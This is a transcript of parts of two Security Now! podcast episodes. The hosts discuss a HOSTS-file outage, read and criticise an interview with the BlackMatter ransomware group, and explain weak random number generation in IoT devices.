LEO:  Jason's on FLOSS Weekly 626, which is last April, if you want to hear Doc and Jonathon talking to Jason Donenfeld, who is the creator of WireGuard.  A work of art.



STEVE:  I wanted to mention that a couple of our listeners caught me mentioning that the problem with Chrome having as much as a five-second delay - this was my discussion last week - having a five-second delay while it's doing that wacky color-based website spoofing detection.  I said, yeah, you wouldn't want your password manager or form fill-in to automatically populate the field, and then you hit login before you get the notification that it's a spoofing site.  Several people said, uh, Steve, one of the advantages of an auto-form-fill password manager is it's not tricked the way users are.  If the URL has a lookalike domain, that's not going to populate.  And so you're going to go, wait a minute, why isn't it filling itself in?  And it's like, oh, it's because that's a fraudulent site.



So I stand corrected.  Thank you, listeners, for paying such close attention.  And I wanted to make sure everybody realized that that was the case.  I don't say that often enough, and I should, that that is clearly a benefit of a password manager like Bitwarden, is it looks at the exact URL, and only if it's an exact...



LEO:  It's not fooled, yeah.



STEVE:  ...match will it do the population.  Unlike the typical user, who's like, oh, yeah, my password is monkey123, and I'll type that in.



LEO:  On bravei dot com, yes.



STEVE:  So a listener, Clay Seale, tweeted:  "Steve:  Any recommendations after 'Project Hail Mary'?  It was an outstanding read."  And so I wanted to share that the "Bobiverse" trilogy is highly and often recommended by our listeners as being fun and a bit whimsical, I guess, in some way reminiscent of "Project Hail Mary."



Okay, so the teaser on Amazon about the book, it reads:  "Bob Johansson has just sold his software company and is looking forward to a life of leisure.  There are places to go, books to read, movies to watch.  So it's a little unfair when he gets himself killed crossing the street.



"Bob wakes up a century later to find that corpsicles have been declared to be without rights, and he is now the property of the state.  He has been uploaded into computer hardware and is slated to be the controlling AI in an interstellar probe looking for habitable planets.  The stakes are high, no less than the first claim to entire worlds.  If he declines the honor, he'll be switched off, and they'll try again with someone else.  If he accepts, he becomes a prime target.  There are at least three other countries trying to get their own probes launched first, and they play dirty.



"The safest place for Bob is in space, heading away from Earth at top speed.  Or so he thinks.  Because the universe is full of nasties, and trespassers make them mad - very mad."



LEO:  This is a great premise.  I love it.  I love it.



STEVE:  So I do not yet have any firsthand knowledge or recommendation myself.  But Leo, I feel as you do about that hook.  I'm currently on Book #19 of my incredibly enjoyable reread of Ryk Brown's 30 books so far out of his planned 75 Frontiers Saga.  I love the Frontiers Saga.  As we know, I love reading science fiction.  So perhaps the bar isn't that high.  And it does feel as though it is time finally to move on.  So I doubt I will reread them again until I'm in my dotage, fully resigned from software development and R&D in areas of human health and wellness.



And I think that from now on I will hold off on anything Ryk does until he finishes each subsequent 15-book arc since it's too frustrating to be waiting month after month for the next book to drop.  So for what it's worth, I have also received a lot of positive feedback about the Frontiers Saga, so it's not just me loving them.  In any event, once I finish this current reread, the Bobiverse trilogy, beginning with "We Are Legion," will be up next.



LEO:  Yeah, that sounds good.  I'd like to read that.  Very funny.



STEVE:  So since I got a ton of feedback after sharing my story of the recovery of that inaccessible BitLocker-encrypted drive, I thought I'd share an engaging recent anecdote that I posted to the spinrite.dev newsgroup last Saturday after I lost an entire day.



LEO:  All right, Steve.  I can't wait to hear the story of your lost day.  



STEVE:  So my posting, I'll just read what I posted to the newsgroup last Saturday.  I said:  "Gang, I hadn't checked in for a while, so I thought that after a lost day of work, yesterday, I'd do so before settling back down to it.  The day before yesterday, the 29th, around noon, the ecommerce system I wrote back in 2003 began failing and reporting timeout errors when attempting to connect to our backend credit card processing provider.  I would normally have been informed of this immediately, but the monitoring system I have been using for years" - actually ever since '03 - never recovered after a power outage a few months back, and I hadn't wanted to take the time away from work to fix it.



"So yesterday, Sue let me know that a few would-be customers had reported that they'd been unable to purchase SpinRite.  She sent me a text message which captured my attention.  The short version is that I spent nearly the entire day pulling out what very little hair I have trying to figure out WTF was going on.  The error reports that my own code was logging was a 0x2EE2 from the WinINet API, which is 'operation timed out,' and Windows' own error logging was complaining of 'TLS handshake errors,' which could have been more informative.



"That sent me off on what turned out to be a wild goose chase, assuming that my provider had changed their TLS connection parameters in a way that was incompatible with my aging Win2008 R2 Server.  The fact that DigiCert, also their cert provider, had just revised some of their intermediate certs, and GRC's server certs were reporting an invalid intermediate, didn't help.



"Many hours later, the final clue came when a ping to the service to the IP address I received from NSLOOKUP worked, whereas a ping to the same service with 'ping' doing the IP lookup did not.  When I looked more closely, I saw that NSLOOKUP and ping were resolving different IPs.  I use my network's own Unix BIND instance as my recursive DNS resolver, so I became suspicious of it.  But additional testing showed that it wasn't at fault.  That was at the end of the day.



"So I finally thought, fine.  I'll just force the resolution to an IP that I know works by adding an entry to the local HOSTS file.  And there I found the override to that domain's old IP, already in the local HOSTS file.  For some reason, sometime in the distant past, I had hard-wired the backend provider's IP myself.  And then, two days ago, they finally changed their server's IP, no doubt doing so with great forethought, running over all IPs while giving DNS caches times to expire and refresh, and my old hard-wiring didn't allow my system to follow.  I removed the entry from the HOSTS file, and everything worked again perfectly.  I love computers because they always do exactly what we tell them to."



So anyway, spent a day, couldn't figure out what was wrong.  It was because who knows how long ago, for some reason, I don't even remember why would I have done that, why would I have wired that domain name to their IP.



LEO:  Well, you were about to do it again, so I'm sure there was a good reason then.



STEVE:  Yes.  Very good point.  I was about to do it again.



LEO:  Wow.  That's like an "ohhh" moment, where you slap your face.



STEVE:  Yes.  And, you know, it was costing me SpinRite sales.  



LEO:  Yeah, yeah.



STEVE:  Everybody was saying, you know, it was timing out.



LEO:  Well, that's the thing.  You're working under pressure because you've got to fix it.  You can't go to bed with it broken.



STEVE:  Exactly.  And that's what it was, was it was like, okay.  I can't figure out what's wrong.  I'm just going to put some glue in here to fix it.  And it was like, oh, wait.



LEO:  I already did.



STEVE:  There's already glue in there.  And it's gummed up the works.



LEO:  Wow.  Yeah, yeah.  This is why engineering departments have protocols and log books and all this stuff, because this stuff is so easy.  If it's just you, you're not going to document all the changes you make.



STEVE:  Well, sadly there's no one to blame.  Not like I ever had Harvey, who was that intern who wandered off.  Like, eh, no.



LEO:  That's so funny.  Oh, lord.



STEVE:  Anyway, I finished my note by giving everybody an update on SpinRite.  And in fact I thought of you, Leo, because you mentioned macros in assembly language on Saturday.



LEO:  Yeah, we were talking about that.  I was thinking of you, yeah.



STEVE:  So I wrote:  "On a happy note, in the same vein of loving computers because they do exactly what we tell them to, I wanted to report that the use of my built-to-suit virtualized I/O function, and the new way I'm handling errors occurring in a massively long block of sectors, has turned out to be somewhat jarringly correct.  As can happen when everything is designed properly, everything has just fallen into place by itself.



"When I was interrupted yesterday" - by that self-created problem - I said:  "I was working on synchronizing SpinRite's logging system with the new inner loop, since the information that can be logged has changed significantly.  It took me a while to understand why I had originally built the logging system the way I had, since it seemed way over-designed and overly complex.  It uses short log entry trigger tokens which are accumulated into a queue, then later flushed, expanded into their full-size log entries and written.



"I couldn't figure out why I went to so much work until I remembered the challenge that I had taken up and accepted, that SpinRite could log onto the same FAT partition that it was operating on, without any compromise.  This meant that the log file itself might be written to the same track and sectors that SpinRite was in the middle of working on at the same time.



"But I already had full track virtualization.  I was intercepting DOS's writes to the drive through the BIOS or device drivers, or compression drivers <shudder> and rerouting any reads and writes to the drive to a virtual buffer of the current track.  So that wasn't why I was deferring the logging with a queue.  It turned out that I was deferring the logging with a queue of short event tokens since I was later reusing the track buffer for token expansion to reduce SpinRite's memory footprint to the absolute minimum."  Remember back then we didn't even know we were going to have 640K.  There were systems with 320K or less.  And people would have device drivers and TSRs and other stuff bloating their DOS.



So I wrote SpinRite so that it didn't use a byte of RAM that it didn't have to in order for it to be able to work in every case.  So what I ended up with was I ended up with a tokenized log system where once SpinRite was through with the track, it would put it all back.  That would free up the 32K track buffer that I could use to expand the logging events into as I wrote them out to the device.  So I really engineered this thing like crazy.



And I finished up:  "Anyway, the system I built is pretty slick.  It uses macros to implement its own meta language to make the implementation and result visually clean and clear.  Although I don't need any of that anymore, it's all in place, and it works, so I'm leaving it alone.  I just needed to remember and understand how it worked so that I could confidently modify and extend its operation today."  And I finished:  "I'm returning to work on SpinRite, now with the mystery of the dead ecommerce system nicely resolved.  Sheesh."  So yes, Leo.  What you and I both mentioned was the idea that it was possible, even though you're writing in assembler, to use macros to design a meta language so that you are able to implement something at a higher level which is expanded by the assembler and doesn't require any runtime interpretation.



LEO:  Yeah.  It's very simple, but it saves a lot of typing.



STEVE:  Yes, it does.



LEO:  You do stuff over and over and over again in assembler.  There's just some things you just do all the time.



STEVE:  Well, and MASM, Microsoft's assembler, it has - it's called PROC and ENDP. 



LEO:  Right.



STEVE:  So I'm able to define something and say PROC, and then I say uses, you know, EBX, ESI, and EDI, and then give it a list of parameters that this procedure will receive and what types they are.  And it's like, yeah, it's not like a string type, but it could be a pointer, and it can be a byte, well, not a byte actually, you can't push or pop bytes, but a word or a double word.  And so within the constraints of the machine code, you're able to create very good-looking code.  And the compiler, or the assembler rather, it does all of the stack setup.  You're able to define locals, so it creates a stack frame for you, and does a lot of that stuff that we're used to only getting in high-level language in assembly language to make it look really good.



LEO:  That's the M in MASM, Macro, yeah.



STEVE:  That's right.  Okay.  The BlackMatter Interview, or 'Tude from Russians.  The security firm, as I mentioned, Recorded Future, introduced their exclusive interview to a representative, well, introduced their exclusive interview of, sorry, of a representative of the group which now calls itself BlackMatter.  They opened their interview by saying:  "In July, a new ransomware gang started posting advertisements on various cybercrime forums announcing that it was seeking to recruit partners, and claiming that it combined the features of notorious groups like REvil and DarkSide.



"Named BlackMatter, the gang said it was specifically interested in targeting large companies with annual revenues of more than $100 million.  However, the group said some industries were off limits.  It would not extort healthcare, critical infrastructure, oil and gas, defense, non-profit, and government organizations."  I notice that in this they didn't mention education.



Anyway, they said:  "A representative from the group talked to a Recorded Future expert threat intelligence analyst recently about how BlackMatter is learning from the mistakes of other ransomware groups" - or maybe their own previous mistake - "what they look for when they recruit partners, and why they avoid certain targets.  The interview was conducted in Russian and translated to English with the help of a professional translator, and has been edited for clarity."



Okay.  So as we're listening to this conversation, remember that there's no honor among thieves, and we already know with virtual certainty that BlackMatter is DarkSide, sharing virtually identical and unique codebases.  And I'll also note, based on the timing of this, not being off the air very long; right?  They're making too much money to go away for long.  So that all further explains why they didn't further obfuscate their own crypto.  It's like, yeah, why bother?  We'll just change our name.



So Dmitry is the guy at Recorded Future.  He says - and this was conducted online in writing as opposed to real time, because at one point they talk - the BlackMatter group talk about getting the question and checking around for the answer.  So Dmitry asks:  "Your product appeared quite recently; and as far as we know, there have been no public attacks using BlackMatter yet.  How long ago did you start developing it?"



BlackMatter replies:  "There haven't been any attacks yet, if you are judging by the public blog.  In fact, there have been, and the companies we attacked are already communicating with us.  As long as the negotiations are successful, we do not publish a blog post on the main page of the blog.  The product has been in development for the past six months."  Uh-huh.  "Perhaps it seems simple, judging by the blog or the communication page.  But it is not.  What users see publicly is the tip of the iceberg."



Then they continue:  "Before starting the project, we studied the following products in detail.  LockBit has a good codebase, but a skimpy and non-functional panel."  And by the "panel" they're talking about the interface that the affiliates use in order to log in and manage their particular own instance of the ransomware.  They said:  "At the time we used their product."  So that sort of sounds like they're saying these guys were once affiliates who used LockBit, and they decided to become ransomware authors themselves.  They said, and this is a weird analogy:  "If you compare it to a car, you can say that this is a Japanese car production line with good engines, but an empty and non-functional interior.  You can ride one, but with little pleasure."  Okay?  So they don't like the control panel that LockBit was using.



They said:  "REvil is a good product on the whole, time-tested software.  Since GandCrab, they haven't made any significant edits since that time.  And actually we can confirm that since we talked about the REvil codebase.  They said:  "A fairly functional panel, but focused more on the overall number of successful 'loads' as opposed to specific targeted cryptography."  Okay.  They said:  "DarkSide is a relatively new software with a good codebase, partly problematic, but the ideas themselves deserve notice, and an interesting web part compared to other Ransomware as a Service."



And then finally they said:  "The executable itself has incorporated the ideas of LockBit, REvil, and partly DarkSide.  The web part has incorporated the technical approach of DarkSide since we consider it the most structurally correct," he says, "(separate companies for each target, and so on)."  And of course were you to actually be DarkSide, then yes, the backend crypto structure would be the same because that's a function of the crypto structure of the code, which we know from analysis is the same.



So Recorded Future asks:  "How difficult is it to organize an affiliate program, also known as Ransomware as a Service?"  They respond:  "On the whole, less difficult than not.  The level is important.  RaaS can also be offline, when builds are issued via Jabber/Tox.  But there is no market demand for this; and current customers, after using REvil and DarkSide, are not ready to take such affiliate programs seriously."  In other words, you have to have a good-looking control panel to look like you're really in the game.  He said:  "We created a project and brought it to the market exactly at a time when the niche is vacant" - yeah, because everyone disappeared - "and the project fully meets the market demands.  Therefore its success is inevitable."



Recorded Future asks:  "Most recently, the largest groups - DarkSide, REvil, Avaddon, BABUK - have disappeared from the scene.  Many researchers believe that this was due to the attention of the top leadership of the United States and Russia to the situation with ransomware attacks.  Is this true?  Do you think your product will have the same fate?"  Their reply:  "Yes.  We believe that to a large extent their exit from the market was associated with the geopolitical situation on the world stage.  First of all, this is the fear of the United States and its planning of offensive cyber operations, as well as a bilateral working group on cyber extortion.  We are monitoring the political situation, as well as receiving information from other sources.



"When designing our infrastructure, we took into account all these factors, and we can say that we can withstand the offensive cyber capabilities of the United States.  For how long?  Time will tell.  For now, we are focusing on long-term work.  We also moderate the targets and will not allow our project to be used to encrypt critical infrastructure, which will attract unwanted attention to us."



Question:  "You mention that your product brings together the very best of DarkSide, REvil, and LockBit.  What are their strengths?"  They said:  "Our project has incorporated the strengths of each of the partner groups.  From REvil, Safe Mode.  Their implementation was weak and not well thought out.  We developed the idea and thoroughly implemented it.  We also implemented the PowerShell version of the ransomware variant given the REvil implementation.  From LockBit, an approach to the implementation of the codebase.  We took some things from there, mostly little things.  From DarkSide:  First of all, this is the idea of impersonation, the ability of the encryptor to use the domain administrator account to encrypt the shared drives with maximum rights.  We also borrowed the structure of the admin panel from there."  Uh-huh.  Probably the code itself.



Question:  "Based on the latest reports published this week, BlackMatter is visually very similar to DarkSide.  Can you confirm that your infrastructure is based on DarkSide?"  Answer:  "We can confidently say that we are fans of dark mode in design.  We are familiar with the DarkSide team from working together in the past, but we are not them."



LEO:  No.



STEVE:  Fear not, Alexander.  "Although we are intimate with their ideas."  Okay.  Question:  "LockBit 2.0 is considered the fastest locker at the moment.  What is the encryption/decryption speed of your variant?"  And they respond:  "This is not true.  After reading the question, we decided to prepare ourselves by downloading the latest publicly available version of LockBit, that's 6.21, and conducting tests.  We can state the following:  BlackMatter time required, 2.22.  LockBit time required, 2.59."



They said - and this is interesting.  I did not ever know this.  I've never seen this reported.  They said:  "The tests were carried out under the same conditions.  Moreover, LockBit encrypts the first 256K of the file," they said, "which is pretty bad from the point of view of cryptographic strength.  We, on the other hand, encrypt 1MB.  Essentially, that's the secret to their speed."  Now, that's interesting, Leo.



LEO:  So they don't encrypt the whole file.



STEVE:  No.  I've never encountered that.  And it's interesting when you think about, it's like, okay.  It doesn't kill everything.  It kills executables completely.  Obviously it covers anything up to, in the case of LockBit, 256K; in the case of BlackMatter, 1MB.  That's interesting.  But not the whole file.  Clearly they do that because they can't afford the time.  They're in a big hurry to get this stuff encrypted.  And so encrypting the front, a big chunk of the front, they figure, okay, that's enough to merit an extortion payment.



Question:  "Are you planning to add new features to the product, following the example of StealBit?"  And they said:  "Yes, the software is constantly being improved, in terms of the new functions that will appear in the near future, printing the text of the note on all available printers.  We also watch our competitors and always implement what we consider promising and in demand by our clients."



Question:  "I've already seen several recruiting announcements for your team.  How many penetration testers would you like to recruit?  Is it easier to work with a small but strong team, or with an army of script kiddies?"  Answer:  "We are geared at strong, self-sufficient teams with experience, their own technical solutions, and a real desire to make money, not someone who wants to try the business out.  We usually filter out script kiddies before they get access to our admin panel."



Question:  "Obviously, there are many talented professionals on your team.  Why is it that this talent is aimed at destructive activities?  Have you tried legal penetration testing?"  Answer:  "We do not deny that business is destructive.  But if we look deeper, as a result of these problems, new technologies are developed and created.  If everything was good everywhere, there would be no room for new development."  Like we're good for security because the problems that we exploit are being fixed.  Oh, okay.



Then they say:  "There is one life, and we take everything from it.  Our business does not harm individuals and is aimed only at companies.  And the company always has the ability to pay funds and restore all its data.  We have not been involved in legal pentesting, and we believe that this could not bring the proper material reward."  In other words, yeah, it doesn't pay so well.



LEO:  We make more money, yeah, extortion, yeah.



STEVE:  $4 million from some company, yeah.



LEO:  Yeah.



STEVE:  Question:  "What do you think about the attacks carried out against Colonial Pipeline's infrastructure or JBS?  Does it make sense to attack such large networks?"  Answer:  "We think that this was a key factor" - gee, you think? - "for the closure of REvil and DarkSide.  We have forbidden that type of targeting, and we see no sense in attacking them."



Question:  "The U.S. Department of Justice said they were able to recover some of the bitcoins paid by Colonial.  How do you think this has happened?"  Answer:  "We think that the DarkSide team" - and they may have reason to know - "the DarkSide team or their partners transferred bitcoins to web wallets, which led to the seizure of their private keys."



LEO:  That's what we speculated, some sort of escrow wallet.



STEVE:  Yeah, exactly.  Question:  "You are actively buying access to the networks and declare that you are not interested in government and medical institutions.  At the same time, you stated that you will not encrypt a wide range of industries, including critical infrastructure, defense, non-profit, and oil. Who has the last word to encrypt the network or not?"  Answer:  "The last word is ours.  We check each target and decide if it has potential negative consequences for us.  The discrepancy between the industries in the blog and on the forum is related to marketing.  In personal correspondence we filter out those which we are not interested in."



Question:  "What type of primary network access is the easiest in 2021 in your opinion?"  They say:  "We do not work with VPN and other time-consuming types of initial access, but are focused on getting direct access to the network immediately."  Which I thought was interesting.  They don't like VPN access.  They want RDP or, you know, they're getting greedy.  They like domain admin, please. 



LEO:  Didn't they use a VPN to get into Colonial Pipeline?



STEVE:  Yeah, yeah.  But, yeah.  Who knows what that's about?  And certainly a VPN would give you lots of access.



LEO:  Yeah.  I would prefer give me passwords to server, please.  Thank you very much, yes.  That's my preferred way of getting in.



STEVE:  So, question:  "What carries more effect motivating the company to pay, the infrastructure being unavailable or the fear of a data leak?"  Answer:  "It varies from company to company."



LEO:  But we use both, just in case.



STEVE:  Yeah.  "For some it is important to maintain confidentiality, for others it's restoring infrastructure.  If the network is completely encrypted, and there is also a risk of data being published, the company will most likely pay."



Question:  "Unknown" - that's the name given to REvil's public spokesperson - "spoke about a special outlook toward insurance companies.  Do you think that if insurance companies abruptly stop covering ransomware incidents, it will change your interest in ransomware?"  Answer:  "It will not change.  The companies will continue to pay money regardless.  It is possible that the amount being paid may decrease.  Now the insurance fees have increased.  But fearing that they will be left alone in the situation, everyone will continue buying the insurance."



Question:  "What's happened with Unknown?  There are a lot of rumors.  Can you clarify the situation?"  Answer:  "We do not know.  Most likely, after the last payment, he went on vacation or is preparing a rebranding of their project."



And then the last one, last question:  "Tell me a secret."  And the answer:  "There are no secrets.  But we believe in our motherland, we love our families, and we earn money for our children."



LEO:  We are good people.  We don't hurt anyone.  No.  Is for the children.  That's why we do it.



STEVE:  That's right.



LEO:  That's depressing.  I almost kind of regret giving these bozos any attention at all.  But it is interesting.  It's informative.



STEVE:  Yeah.



LEO:  Oof.  Oof.



STEVE:  Yup.  Forewarned is forearmed.



LEO:  Yeah, yeah, yeah.  And they're really, you know, it's so interesting how they rationalize.  Oh, we don't hurt individuals.  We hurt no people.  Just big companies.



STEVE:  Just big fat Western companies.



LEO:  Yes, is for our children we do this.  So sad.  Well, Steve, thank you.  I appreciate it, as always.  A very interesting Security Now!.  We do the show every Tuesday, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  So you can watch us do it live, if you want, if you want the latest, freshest version of Security Now!.  The livestreams are at TWiT.tv/live, audio and video.  People who listen live often like to chat with others also listening live.  That's irc.twit.tv.  That's our IRC channel.



If you're just looking for copies of the show after the fact, Steve has both 16Kb and 64Kb audio, the 16Kb for the bandwidth-impaired.  That's a unique format.  Only he has it:  GRC.com.  Also you'll find transcripts there that are really helpful for searching and reading along as you listen:  GRC.com.  While you're there, pick up the world's best mass storage maintenance and recovery utility, SpinRite v6.  Version 6.1 is in progress.  You buy it now, you'll get 6.1 for free, but you'll also get to participate in its development on the SpinRite forums and all of that.



Actually there's a lot of great stuff at GRC.com, not just the forums, but all sorts of information about a variety, a wide-ranging variety of topics because Steve is absolutely wide-ranging in his interests.



We also have copies of the show at our website, TWiT.tv, 64Kb audio and video.  TWiT.tv/sn is the specific link.  Once you're there you'll also see a link to our YouTube channel.  There's a Security Now! YouTube channel with all the shows there.  There's also links to the various big-name podcast players, but you also get an RSS feed, so you can subscribe in any podcast player.



But do us a favor.  If you subscribe in Google Podcasts, Apple Podcasts, Pocket Casts, Overcast, if they have a directory and a chance to review, please give us a five-star review.  Let the world know.  You know about Security Now!.  But let everybody else know.  The more people that listen to this show, I think the better off we all will be.  We'll be a lot safer, anyway.  So a five-star review would be much appreciated.



I think that concludes everything I needed to tell you, all the business parts of the show.  Steve will be back next week.  Have a great week.



STEVE:  Will do.



LEO:  See you then.



STEVE:  Thanks, buddy.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#831

DATE:		August 10, 2021

TITLE:		Apple's CSAM Mistake

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-831.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at a pervasive failure built into the random number generators of a great many, if not nearly all, lightweight IoT devices.  We look at some old, new, and returned critical vulnerabilities in major VPN products.  And we encounter 14 fatal flaws in a widely used embedded TCP/IP stack.  We look at a number of terrific bits of feedback from our listeners.  Then we carefully examine the operation and consequences of Apple's recent announcement of their plan to begin reacting to the photographic image content being sent, received, and stored by their iOS-based devices.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about, including a problem in a not-so-random number generator widely used by IoT.  An error in a TCP stack that's been in use since 2003, still no fix to that.  Then Steve's going to take a look at the technology behind Apple's new CSAM Detection protocol and whether it's a very good idea or not.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 831, recorded August 10th, 2021:  Apple's CSAM Mistake.



It's time for Security Now!, the show where we cover your security and privacy - yay, I know, I hear the cheers all across this great country, this great globe of ours.  People excited.  Must be Tuesday.  It's Security Now! time.  And of course the one, the only Steve Gibson, ladies and gentlemen.  Good to see you.



STEVE GIBSON:  And our fans will be so relieved to hear that this week we have not a single mention of ransomware.



LEO:  Not because there is no ransomware.



STEVE:  Except that one mention that I just made.  That is the only time that word will be used for the next two hours.  So Elaine...



LEO:  Just retire that from your keyboard.  You don't need it anymore.



STEVE:  You had your finger on the fast-forward button on your podcast player.  Just put it back in your pocket.  You will not be needing that.  Well, maybe until the end because we do have to talk about what Apple has announced that they're planning to do.  Although I really like the way I couch this.  I said in my little description:  "Then we carefully examine the operation and consequences of Apple's recent announcement of their plan to begin reacting to the photographic image content being sent, received, and stored by their iOS-based devices."  So anyway, we're going to talk about this basically porn filtering that Apple has decided that they need to do, you know, child...



LEO:  Kiddie porn, yeah.



STEVE:  Abusive kiddie porn, yes.  Which is illegal in the U.S. and in many countries.



LEO:  As it should be, yup.



STEVE:  But first we're going to take a look at a - we have some fun stuff - a pervasive failure built into the random number generators - Leo, we're back to the random number generators again - of a great many, if not nearly all, lightweight IoT devices.  And we'll talk about the consequences, remind our listeners about that, talk about some physics of random number generation in hardware and then what happened.  We're also going to look at some old, new, and returned critical vulnerabilities in major VPN products.  And we encounter 14 fatal flaws - that was a runner-up for the title - in a widely used embedded TCP/IP stack.  So, oh, and some great feedback from our listeners.  Boy, I'm sure glad I told everybody about, was it Tailgate?  Was that the name of it?  Anyway, we'll - doesn't sound like the right name, but it was Tail something.  We'll get there in our listener feedback because it's been just like an amazing hit.  And we even had a listener who remembered, believe it or not, why I had that mistake in my hosts file from 2016.



LEO:  Oh, he actually heard you do it or something?



STEVE:  Yes.  I talked about it at the time.



LEO:  Oh, my.



STEVE:  He said, Steve, go back to Episode 500 and whatever it was.



LEO:  It's good we record everything, isn't it.  



STEVE:  Boy, I'll tell you, it's fun to have those searchable transcripts.  So glad we have Elaine, too.  So I think a great podcast for everybody.



LEO:  Fantastic.



STEVE:  And no mention of the "R" word.  We're just, you know, none of that.



LEO:  No R'ing.



STEVE:  No, unh-unh.



LEO:  I am actually very interested in your take on Apple's CSAM thing, of course, because you get very technical, and there's lots of technical details that I think were misreported in some cases. 



STEVE:  Oh, Leo, it's been a catastrophe. 



LEO:  Yeah, yeah.



STEVE:  Of miscommunication.  And it's weird, too, because we're seeing some companies, this is not the first time that we've talked about like a really flubbed rollout of something.  And I almost - it feels to me like the engineers get too in love with their technology, and they forget, like, what the rest of - oh, I know what it was.  It was the mess of Amazon's Sidewalk rollout.



LEO:  Right.



STEVE:  Where what the news covered was, oh, your neighbors are going to be stealing your WiFi.  It's like, no.  That can't happen.  But that's what everyone ran with.  It's like, okay.  Anyway, yeah.  So technology.



LEO:  The technical details coming up.  Picture of the Week time, Steve.



STEVE:  So this was inspired by last week's crazy wiring closet.  And I gave this one the caption "The more things change, the more they stay the same."  Now, for those who are not looking at the video, this, I don't know, Leo, are these telegraph wires?  Or do we have telephones by then?



LEO:  Yeah, good question.  It's not power.  It's got to be... 



STEVE:  Oh, yeah.



LEO:  It's probably telephone because that's point to point; right?



STEVE:  Well...



LEO:  It's a mistake, whatever it is.



STEVE:  So there's a horse in the background, and a buggy.  So this is pre-car.  We don't have plastic.  Plastic was in 1907.  So we had glass for insulators, and you can see little glass insulators.



LEO:  Oh, gosh, yeah, yeah, yeah.



STEVE:  So those must have been cloth-wrapped wires.



LEO:  Oh, my god.



STEVE:  Which are, like, again, this came to mind because of last week's wiring closet.  And so maybe that's the switchboard building there on the left, where like everything is going in in order to be cross-connected, in order to connect Mabel to Myrtle or something?  I don't know.  But anyway, this is another one that's probably worth going and finding the show notes if you normally listen and don't bother looking because this is, you know, it's true.  And there's a guy, a lineman presumably, posing about his height up on the pole.  And this also really begs the question, Leo, much as we did last week, like what happens if one of those goes bad?  There's wires up on top, you can't get to them any longer.



LEO:  No.  Yeah, how would you get up there?  You need a cherry-picker or something.



STEVE:  And we didn't have those.  Or maybe, I don't know how you did things in the old days.



LEO:  A balloon.  I don't know.



STEVE:  Scaffolding of some sort.



LEO:  Right.



STEVE:  Anyway, Tom Gerald tweeted that.  So thank you, Tom.  I appreciate it.  And I should say we have a couple others which came in since.  So we'll have a few weeks of wiring closets you never want to encounter.



Okay.  So this is probably my favorite talk title of this summer's DEF CON / Black Hat 2021.  This is a play on "You're Doing It Wrong."  This is "You're Doing IoT RNG."  So obviously Internet of Things Random Number Generator.  A pair of researchers from Bishop Fox Labs titled their talk "You're Doing IoT RNG."  They dug into the source of entropy being used by some of today's most popular IoT platforms, and actually apparently by all of them.  And to say that they found it wanting would be an understatement.  To get their audience's attention they began by noting:  "There's a crack in the foundation of Internet of Things security, one that affects" - Leo, are you centered over your ball? - "one that affects 35 billion devices worldwide."



LEO:  Oh, my god.  What?



STEVE:  Yeah, 35 billion with a "b."  I think that's all of them.  "Basically," they said, "every IoT device with a hardware random number generator contains a serious vulnerability whereby it fails to properly generate random numbers."  And Leo, if this sounds like an echo of podcasts past, well, yes, because of course we talked about all this stuff a long time ago.



LEO:  Historically, computers are terrible at random numbers.  That's why most of the time they're called "pseudorandom number generators"; right?  Yeah.



STEVE:  Correct.  And as we know, pseudorandom number generators tend to be resource intensive.  Anyway, they finish by saying this "undermines security for any upstream use."



Okay, so let's roll back a little bit.  Many years ago on this podcast, when we were laying the foundation of cryptography and the requirements for securely encrypting both data at rest and data in flight, which is to say communications, we explained the importance of a high-quality source of entropy.  As an example, we often talked about the very popular Diffie-Hellman key agreement system, where each side picks a number at random, turns it into a key by performing some crypto math on it, then sends it to the other side.  So thus they exchange these keys.



And the cool thing about this, which makes it so valuable for securing communications, is that each side is able to make their originally chosen random number themselves, so they're able to take their originally chosen random number, along with the key they receive from the other party, and combine those to arrive at a new key.  And each side of this connection or this nascent connection will arrive at the same new key.  But the most critical aspect of this is that anyone eavesdropping on that initial communication is able to observe and obtain the keys for themselves which each side sent to the other, yet even so that eavesdropper is unable to recreate the key that both ends now share.



So this allows the ends to then start using the key that they now share to establish truly private communications.  They then use that as an encryption key, or one of them chooses a key at random and then uses the shared key to encrypt that to send it to the other end.  You know, there's all kinds of ways to skin that cat, given that you've got these fundamentals.  Nothing, however, more fundamental than having entropy, being able to pick a random number.  That's the first thing that each side did.  They chose a random number.  And it's crucial to the security of the entire process that each side's chosen random number cannot be known or guessed by anyone else.



Another example, famously, was Dan Kaminsky's observation that DNS servers were emitting IDs in sequence rather than randomly, which allowed all of the anti-spoofing measures to just be short-circuited, to be collapsed.  So the need for randomness is everywhere.  And that number must be truly random.  But it turns out that it's much easier to specify what we want from a random number or in a random number than it is for a little computer sitting inside a light switch or a webcam to actually generate such a number.



So a random binary number we would define as any string of bits of some specified length where the probability of each bit being a zero or a one is exactly 50/50, and each bit is chosen completely independently of any other of the random bits.  And what you're going to end up with is a big bunch of random bits where there's no association, no connection between them.  So it's easy to ask for.  But software won't do that; right?  It won't.  It's brutally deterministic.  No matter how much you add, subtract, multiply, and divide, if you start from the same starting point, you're always going to arrive at the same ending point.



So in order to break this deterministic cycle, we need some external source of unpredictability.  A little so-called system-on-a-chip, right, an SOC, probably has a radio for WiFi.  So if it was clever, it might hash the WiFi packets it's able to sniff buzzing around in the air, whether they're meant for it or not.  And if it was extra clever, it might even tune its radio to different channels, or maybe listen to the noise being generated by the cosmic background radiation, or what we commonly refer to as static.  It might periodically sample the value of, you know, collect a bunch of that stuff, hash it all, and then dump the results into a growing pool of entropy.



